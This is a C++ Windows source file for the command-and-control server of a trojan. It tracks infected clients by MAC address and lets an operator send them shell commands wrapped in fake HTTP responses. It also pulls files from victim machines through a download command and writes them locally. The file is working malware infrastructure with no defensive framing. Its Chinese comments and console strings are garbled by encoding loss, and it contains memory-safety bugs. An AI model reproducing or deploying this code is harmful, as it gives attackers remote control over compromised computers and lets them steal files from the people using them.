// Server.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <winsock2.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")
#define LOCAL_PORT 4000
#define LOCAL_IP_ADDRESS "0.0.0.0"

#define CMD_NULL		0
#define CMD_CMD			1
#define CMD_DOWNLOAD	2

#define MAX_CMD_LEN		256
#define MAC_ADDR_LEN	17
#define POST_LEN		210
#define DEFAULT_BUFLEN 1024
#define POST_FILE_LEN   1234

typedef struct _TROJAN_INFO
{
	short live_flag;
	char mac[MAC_ADDR_LEN];
	short cmd_no;
	char cmd[MAX_CMD_LEN];
}TROJAN_INFO, *PTROJAN_INFO;
// cmd like:
// dir
// remoteFile*localFile: d:\\1.txt*e:\\2.txt

#define MAX_CLIENT_NUM		10
#define NOW_CLIENT_NUM		3
TROJAN_INFO g_trojan_info[MAX_CLIENT_NUM];
bool inflag = 0;
int now_client_num = 0;

CRITICAL_SECTION cs;

char* protocolHead = "HTTP/1.1 200 OK\r\nServer: Server <0.1>\r\n"
"Accept-Ranges: bytes\r\nContent-Length: 112\r\nConnection: close\r\n"
"Content-Type: application\r\n\r\n";


char * killhead(char* headcmd)
{
	char * goal;
	int len = strlen(headcmd) - (strstr(headcmd, "\r\n\r\n") - headcmd) - 4;
	if (!len || len > 10000)return NULL;
	cout << "���ݰ�����" << len << endl;
	goal = strncpy(headcmd, strstr(headcmd, "\r\n\r\n") + 4, len);
	goal[len] = '\0';
	return goal;
}


char * killhead(char* headcmd,int headdatalen)//���ļ��ȽϿӣ�����λ������
{
	char *result = (char *)malloc(headdatalen-POST_LEN + 1);
	if (result == NULL) exit(1);
	for (int i = POST_LEN; i <= headdatalen + 1; i++)
		result[i - POST_LEN] = headcmd[i];
	return result;
}

int headlen(char* headcmd)
{
	//cout << "��ͷ����" << strstr(headcmd, "\r\n\r\n") - headcmd + 4 << endl;
	return strstr(headcmd, "\r\n\r\n") - headcmd + 4;
}

char* combine(char *s1, char *s2)
{
	char *result = (char *)malloc(strlen(s1) + strlen(s2) + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	strcat(result, s2);
	return result;
}


char* combine(char *s1, char *s2,int len)
{
	char *result = (char *)malloc(len + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	for (int i = POST_LEN; i <= len + 1; i++)
		result[i] = s2[i - POST_LEN];
	return result;
}


char* filedivide(char * sendbuf)
{
	char ans[DEFAULT_BUFLEN];
	memset(ans, 0, DEFAULT_BUFLEN);
	for (int i = 0; i < DEFAULT_BUFLEN; i++)
		ans[i] = sendbuf[i + POST_LEN];
	cout << ans << "<---";
	return ans;
}

void init()
{
	int i = 0;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		g_trojan_info[i].live_flag = 0;
		memset(g_trojan_info[i].mac, 0, MAC_ADDR_LEN);
		g_trojan_info[i].cmd_no = CMD_NULL;
		memset(g_trojan_info[i].cmd, 0, MAX_CMD_LEN);
	}

	InitializeCriticalSection(&cs);
}

int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
{
	int iResult;    //�洢����recv�����ķ���ֵ
	int cnt;         //����ͳ������ڹ̶����ȣ�ʣ������ֽ���δ����
	cnt = fixedlen;
	while ( cnt > 0 ) {
		iResult = recv(s, recvbuf, cnt, 0);
		if ( iResult < 0 ){
			//���ݽ��ճ��ִ��󣬷���ʧ��
			printf("���շ�������: %d\n", WSAGetLastError());
			return -1;
		}
		if ( iResult == 0 ){
			//�Է��ر����ӣ������ѽ��յ���С��fixedlen���ֽ���
			printf("���ӹر�\n");
			return fixedlen - cnt;
		}
		//printf("���յ����ֽ���: %d\n", iResult);
		//���ջ���ָ������ƶ�
		recvbuf +=iResult;
		//����cntֵ
		cnt -=iResult;         
	}
	return fixedlen;
}

void remove_trojan_from_list(char *MacAddr)
{
	
	int i = 0;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			g_trojan_info[i].live_flag = 0;
			memset(g_trojan_info[i].mac, 0, MAC_ADDR_LEN);
			g_trojan_info[i].cmd_no = CMD_NULL;
			memset(g_trojan_info[i].cmd, 0, MAX_CMD_LEN);
			break;
		}
	}
}

void add_trojan_to_list(char *MacAddr)
{
	int i = 0;
	int free_index = -1;
    
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(g_trojan_info[i].live_flag == 0)
		{
			free_index = i;
			cout << i;
			break;
		}
	}

	if(free_index != -1)
	{
		g_trojan_info[free_index].live_flag = 1;
		memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
		g_trojan_info[free_index].cmd_no = CMD_NULL;
		memset(g_trojan_info[free_index].cmd, 0, MAX_CMD_LEN);
	}

}

int get_cmd_by_mac(char *MacAddr, char *CmdBuff)
{
	int i = 0;
	int CmdNo = CMD_NULL;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			CmdNo = g_trojan_info[i].cmd_no;
			sprintf(CmdBuff, "%d#%s", CmdNo, g_trojan_info[i].cmd);
			g_trojan_info[i].cmd_no = CMD_NULL;
			break;
		}
	}
	return CmdNo;
}

void cmd()
{
	int i = 0;
	int free_index = -1;
	int kind;
	if (inflag|| now_client_num<NOW_CLIENT_NUM)return;
	inflag = 1;
	/*cout << "�Ƿ���ָ��"  << "��(y/n)   ";
	char a;
	cin >> a;
	if (a == 'y' || a == 'Y')
	{*/
		

	EnterCriticalSection(&cs);

	char  MacAddr[MAC_ADDR_LEN];
	cout << "\n������Ҫ���͵Ŀͻ���Mac��ַ�� ";
	cin >> MacAddr;

	for (i = 0; i<MAX_CLIENT_NUM; i++)
	{
		if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			free_index = i;
			break;
		}
	}

	if (free_index != -1)
	{
		g_trojan_info[free_index].live_flag = 1;
		//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
		cout << "������Ҫ���͵�ָ�����ࣺ" << endl << "1.��ָͨ�� 2.�ļ�����ָ��" << endl << "(1/2)  ";
		cin >> kind;
		if (kind == 1)
		{
			g_trojan_info[free_index].cmd_no = CMD_CMD;
		}
		if (kind == 2)
		{
			g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
		}
		cout << "����Ҫ���͵�ָ�";
		cin >> g_trojan_info[free_index].cmd;
	}
	else { cout << "�ͻ���mac��ַ����"; }


	/*}
	else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/

	LeaveCriticalSection(&cs);
	inflag = 0;
	return;
}

DWORD WINAPI InputThread(LPVOID lpParameter)
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	int i = 0;
	int free_index = -1;
	int kind;
	/*if (inflag || now_client_num<NOW_CLIENT_NUM)return;
	inflag = 1;*/

	while (TRUE)
	{
		char  MacAddr[MAC_ADDR_LEN];
		cout << "������Ҫ���͵Ŀͻ���Mac��ַ�� ";
		cin >> MacAddr;

		cout << "->"<<now_client_num;
		for (i = 0; i<MAX_CLIENT_NUM; i++)
		{
			cout << g_trojan_info[i].mac << endl;
			if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
			{
				free_index = i;
				break;
			}
		}

		if (free_index != -1)
		{
			g_trojan_info[free_index].live_flag = 1;
			//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
			cout << "������Ҫ���͵�ָ�����ࣺ" << endl << "1.��ָͨ�� 2.�ļ�����ָ��" << endl << "(1/2)  ";
			cin >> kind;
			if (kind == 1)
			{
				g_trojan_info[free_index].cmd_no = CMD_CMD;
			}
			if (kind == 2)
			{
				g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
			}
			cout << "����Ҫ���͵�ָ�";
			cin >> g_trojan_info[free_index].cmd;
		}
		else { cout << "�ͻ���mac��ַ����"; }

		Sleep(2000);
		/*}
		else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/

		/*inflag = 0;
		return;*/
	}

	closesocket(ClientSocket);
	return 0;
}

DWORD WINAPI ClientThread(LPVOID lpParameter)
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	int Ret = 0;
	char RecvBuffer[MAX_PATH];
	int CmdNo;
	int cmdlen;
	char CmdBuff[MAX_CMD_LEN];
	char LocalFile[MAX_PATH];
	char *strTmp;
	bool bFirst = true;
	now_client_num++;
	char filebuf[POST_FILE_LEN];
	char * filenohead;

	while( TRUE )
	{
		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
		if (Ret > 0)
		{
			cout << "���յ�GET����" << RecvBuffer << "(" << Ret << ")" << endl;
		}

		Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
		if (Ret>0) cout << "����Http��Ӧ," << strlen(protocolHead) << "�ֽ�" << endl;
		

		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
		if (Ret > 0)
		{
			cout << "���յ�POST����" << RecvBuffer << "(" << Ret << ")" << endl;
		}
		char* mac=killhead(RecvBuffer);
		cout << "\n--------------------------------\n���ӵ�ľ��mac��ַΪ" << mac <<"�ĵ�ַ"<< endl;

		

		/*if ( Ret != MAX_PATH)
		{
			cout << "�ͻ����쳣���˳�!" << endl;
			remove_trojan_from_list(RecvBuffer);
			break;
		}*/
		
		if(bFirst){
			cout << "��ӵ�ľ���б�" << endl;
			remove_trojan_from_list(mac);
			add_trojan_to_list(mac);
			bFirst = false;
		}

		//cmd(RecvBuffer);
		
		
		// check if the trojan has an cmd to do
		memset(CmdBuff, 0, MAX_CMD_LEN);
		CmdNo = get_cmd_by_mac(mac, CmdBuff);

		char recvbuf[2049];
		FILE *file = NULL;
		char *filename = LocalFile;
		int invfilelen, filelen;
		int recvbuflen = 2*DEFAULT_BUFLEN;
		int iResult;
		char lenchar[MAC_ADDR_LEN];

		switch(CmdNo)
		{
		case CMD_NULL:
			//cout << "��ʱδ�������\n";
			//send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			sprintf(lenchar, "%d", 0);
			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
			if (Ret>0) cout << "�������ʱ��������ͻ��˵�Mac��ַ����ָ�" << endl;
			
			break;
		case CMD_CMD:
			cout << "ִ������" << CmdBuff << endl;
			cout << "�����Ϊ" << strlen(CmdBuff) << "!\n";
			cmdlen = strlen(CmdBuff);
			// send cmd len
			//send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			sprintf(lenchar, "%d", cmdlen);
			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
			// send cmd content
			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead)+ strlen(CmdBuff), 0);
			// recv cmd result from trojan
			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
			printf("���յ���������:  %s(%d)\n", recvbuf, iResult);//����ͷ��Ҫȥ�Ļ�����killhead����
			break;
		case CMD_DOWNLOAD:
			cout << "ִ���ļ�����" << endl;
			// get local file name
			strTmp = strstr(CmdBuff, "*");
			strcpy(LocalFile, strTmp+1);

			// reset cmd information
			CmdBuff[strTmp-CmdBuff] = '\0';
			cout << "Ŀ���ļ�Ϊ" << CmdBuff << endl;
			// send cmd len
			sprintf(lenchar, "%d", strlen(CmdBuff));
			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
			// send cmd content
			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead) + strlen(CmdBuff), 0);
			// recv file from trojan

			iResult = recv(ClientSocket, recvbuf, MAC_ADDR_LEN + POST_LEN, 0);
			if (iResult >0)
			{
				filelen = atoi(killhead(recvbuf));
				cout << "���ݳ���Ϊ  " << filelen << endl;
			}
			file = fopen(filename, "wb+");
			if (file == NULL) { cout << "���ļ�ʧ�ܣ�" << endl; return -1; }

			int torecvlen = filelen;
			// �����������ݣ�ֱ���Է��ر����� 
			do
			{
				//iResult = recv(ClientSocket, recvbuf, POST_LEN, 0);
				memset(filebuf, 0, POST_FILE_LEN);
				iResult = recv(ClientSocket, filebuf, POST_FILE_LEN, 0);
				//filenohead = filedivide(filebuf);
				iResult -= POST_LEN;
				if (iResult > 0)
				{
					cout << "����" << torecvlen << "���ֽ���Ҫ����" << endl;
					int recvlen = iResult;
					if (iResult > torecvlen)recvlen = torecvlen;
					//fwrite(filedivide(filebuf), 1, DEFAULT_BUFLEN, file);
					
						char* buf=filebuf;
						for (int i = 0; i < POST_LEN; i++)
						{
							buf++;
						}
						for (int i = 0; i < recvlen; i++)
						{
							fwrite(buf, 1, 1, file);
							buf++;
						}					
					torecvlen -= recvlen;
					if (torecvlen <= 0)break;

					//���1���ɹ����յ�����
					//printf("���յ�����:  %s(%d)\n", recvbuf, iResult);

				}
				else if (iResult == 0)
				{
					//���2�����ӹر�
					printf("���ӹر�...\n");
				}
				else
				{
					//���3�����շ�������
					printf("���շ������󣡴�����: %d\n", WSAGetLastError());
					closesocket(ClientSocket);
					return -1;
				}
			} while (iResult > 0);

			fclose(file);

			cout << "�ļ����سɹ���" << endl;

			break;
		}
	}

	closesocket(ClientSocket);
	return 0;
}


int main(int argc, char* argv[])
{
	WSADATA  Ws;
	SOCKET ServerSocket, ClientSocket;
	struct sockaddr_in LocalAddr, ClientAddr;
	int Ret = 0;
	int AddrLen = 0;
	HANDLE hThread = NULL;
	HANDLE inThread = NULL;

	init();

	//Init Windows Socket
	if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
	{
		cout<<"Init Windows Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	//Create Socket
	ServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( ServerSocket == INVALID_SOCKET )
	{
		cout<<"Create Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_addr.s_addr = inet_addr(LOCAL_IP_ADDRESS);
	LocalAddr.sin_port = htons(LOCAL_PORT);
	memset(LocalAddr.sin_zero, 0x00, 8);

	//Bind Socket
	Ret = bind(ServerSocket, (struct sockaddr*)&LocalAddr, sizeof(LocalAddr));
	if ( Ret != 0 )
	{
		cout<<"Bind Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}
	//listen
	Ret = listen(ServerSocket, 10);
	if ( Ret != 0 )
	{
		cout<<"listen Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	cout<<"������Ѿ�����"<<endl;


	inThread = CreateThread(NULL, 0, InputThread, (LPVOID)ServerSocket, 0, NULL);
	if (inThread == NULL)
	{
		cout << "Create Thread Failed!" << endl;
	}

	while ( true )
	{
		AddrLen = sizeof(ClientAddr);
		ClientSocket = accept(ServerSocket, (struct sockaddr*)&ClientAddr, &AddrLen);
		if ( ClientSocket == INVALID_SOCKET )
		{
			cout<<"Accept Failed::"<<GetLastError()<<endl;
			break;
		}


		cout << "\n\n�ͻ�������::" << inet_ntoa(ClientAddr.sin_addr)<<":" << ClientAddr.sin_port << endl;

		hThread = CreateThread(NULL, 0, ClientThread, (LPVOID)ClientSocket, 0, NULL);
		if ( hThread == NULL )
		{
			cout<<"Create Thread Failed!"<<endl;
			break;
		}

		CloseHandle(hThread);
	}

	Sleep(INFINITE);

	CloseHandle(inThread);
	closesocket(ServerSocket);
	//closesocket(ClientSocket);
	WSACleanup();

	return 0;
}